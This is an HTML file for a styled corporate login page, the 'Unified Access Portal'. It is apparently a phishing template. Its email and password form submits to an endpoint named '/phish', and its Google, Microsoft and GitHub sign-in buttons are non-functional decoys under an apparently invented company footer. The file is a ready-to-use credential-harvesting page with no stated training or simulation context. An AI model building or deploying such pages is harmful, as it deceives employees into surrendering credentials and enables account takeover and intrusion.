<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Unified Access Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #111827;
    }
    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 420px;
    }
    .container h2 {
      font-weight: 600;
      font-size: 1.5rem;
      margin-bottom: 1rem;
    }
    .input-group {
      margin-bottom: 1rem;
    }
    .input-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-size: 0.9rem;
    }
    .input-group input {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      font-size: 1rem;
    }
    button {
      background: #2563eb;
      color: white;
      width: 100%;
      padding: 0.75rem;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      font-size: 1rem;
      transition: background 0.3s;
    }
    button:hover {
      background: #1e40af;
    }
    .divider {
      text-align: center;
      margin: 1.5rem 0;
      color: #9ca3af;
      font-size: 0.875rem;
    }
    .oauth-buttons {
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
    }
    .oauth-button {
      background: #f3f4f6;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      padding: 0.65rem;
      text-align: center;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.3s;
    }
    .oauth-button:hover {
      background: #e5e7eb;
    }
    .footer {
      margin-top: 1.5rem;
      text-align: center;
      font-size: 0.75rem;
      color: #9ca3af;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Welcome to the Unified Portal</h2>
    <form action="/phish" method="POST">
      <div class="input-group">
        <label for="email">Corporate Email</label>
        <input type="email" id="email" name="email" placeholder="name@yourdomain.com" required />
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="••••••••" required />
      </div>
      <button type="submit">Sign in</button>
    </form>

    <div class="divider">or sign in with</div>
    <div class="oauth-buttons">
      <div class="oauth-button">Continue with Google</div>
      <div class="oauth-button">Continue with Microsoft</div>
      <div class="oauth-button">Continue with GitHub</div>
    </div>

    <div class="footer">
      © 2025 Unified Access Inc. · Privacy · Terms
    </div>
  </div>
</body>
</html>
